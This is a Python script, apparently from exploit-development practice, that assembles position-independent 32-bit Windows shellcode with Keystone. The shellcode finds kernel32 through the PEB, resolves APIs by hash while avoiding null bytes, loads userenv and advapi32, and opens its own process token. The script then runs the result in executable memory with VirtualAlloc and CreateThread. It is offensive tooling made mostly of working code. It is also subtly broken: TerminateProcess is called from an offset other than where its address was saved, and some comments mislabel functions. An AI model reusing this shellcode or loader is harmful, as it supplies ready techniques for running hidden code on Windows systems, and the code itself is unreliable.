import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    #"   int3                            ;"  #   Breakpoint for Windbg.
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffff4f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ?
    "   jne   next_module               ;"  #   No: try next module

    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later usage
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later usage
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later usage
    "   push  0x16b3fe72                ;"  #   CreateProcessA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
    "   push  0xa4048954                ;"  #   MoveFileA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x1C], eax           ;"  #   Save MoveFileA address for later usage   
    "   push  0x73e2d87e                ;"  #   ExitProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x20], eax           ;"  #   Save ExitProcess address for later usage 
    "   push  0xe60dfa02                ;"  #   GetCurrentProcessId hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x30], eax           ;"  #   Save GetCurrentProcessId address for later usage  
    "   push  0xefe297c0                ;"  #   OpenProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x34], eax           ;"  #   Save OpenProcess address for later usage                     

    " load_userenv.dll:                       "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   mov   eax, 0x6c6c6411           ;"  #   Move the end of the string in AX
    "   shr   eax, 8                    ;"  #   shright 8
    "   push  eax                       ;"  #   Push EAX on the stack with string NULL terminator
    "   push  0x2e766e65                ;"  #   Push part of the string on the stack
    "   push  0x72657375                ;"  #   Push another part of the string on the stack     
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA 

    " resolve_symbols_userenv:            "
    "   mov   ebx, eax                  ;"  #   Move the base address of userenv.dll to EBX
    "   push  0xf2ea3914                ;"  #   GetUserProfileDirectoryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x24], eax           ;"  #   Save GetUserProfileDirectoryA address for later usage

    " load_advapi32.dll:                       "  #
    "   mov   eax, 0xffffffff           ;"  #   move -1 into eax
    "   inc   eax                       ;"  #   inc to get zero
    "   push  eax                       ;"  #   null terminator
    "   push  0x6c6c642e                ;"  #   Push another part of the string on the stack  
    "   push  0x32336970                ;"  #   Push another part of the string on the stack    
    "   push  0x61766461                ;"  #   Push another part of the string on the stack      
    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA

    " resolve_symbols_advapi32:            "
    "   mov   ebx, eax                  ;"  #   Move the base address of advapi.dll to EBX
    "   push  0x8d91ea66                ;"  #   OpenThreadToken hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x28], eax           ;"  #   Save OpenProcessToken address for later usage
    "   push  0x591ea70f                ;"  #   OpenProcessToken hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x2c], eax           ;"  #   Save OpenProcessToken address for later usage    

    #Try getcurrentprocessid
    " call_getcurrentprocessid:                  "  #         
    "   call dword ptr [ebp+0x30]       ;"  #   Call getcurrentprocessid
    "   push  eax                       ;"  #   push current process id = dwProcessId
    "   push  0x45555254                ;"  #   push TRUE bINheritHandle
    "   mov   ax, 0x0411                ;"  #   null eax
    "   sub   ax, 0x11                  ;"  #   subtract
    "   push  eax                       ;"  #   PROCESS_QUERY_INFORMATION
    "   call dword ptr [ebp+0x34]       ;"  #   call openprocess
    "   mov   edx, eax                  ;"  #   save current handle
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   xor   ecx, ecx                  ;"  #   clear ecx
    "   mov   cx, 0x7eb                 ;"  #   Move 0x580 to CX
    "   sub   eax, ecx                  ;"  #   Substract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   TokenHandle
    "   xor   eax, eax                  ;"  #   clean eax
    "   mov   ax, 0x2811                ;"  #   desirecdaccess
    "   shr   eax, 8                    ;"  #   shift to get 25
    "   push  eax                       ;"  #   push desicredaccess
    "   push  edx                       ;"  #   PorcessHandle  
    "   call dword ptr [ebp+0x2c]       ;"  #   call openprocesstoken    

    " call_TerminateProcess:                 "   #
    "   xor   edx, edx                  ;"  #   Nullx edx
    "   push edx                        ;"  #   ExitCode 0
    "   push 0xffffffff                 ;"  #   HANDLE hProcess
    "   call dword ptr [ebp+0x40]       ;"  #   Call TerminateProcess


)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

#print shellcode
print("Shellcode:\n")
finalcode = ""
for dec in encoding: 
  finalcode += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
print("shellcode = (\"" + finalcode + "\")")
input("...ENTER to continue...")

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
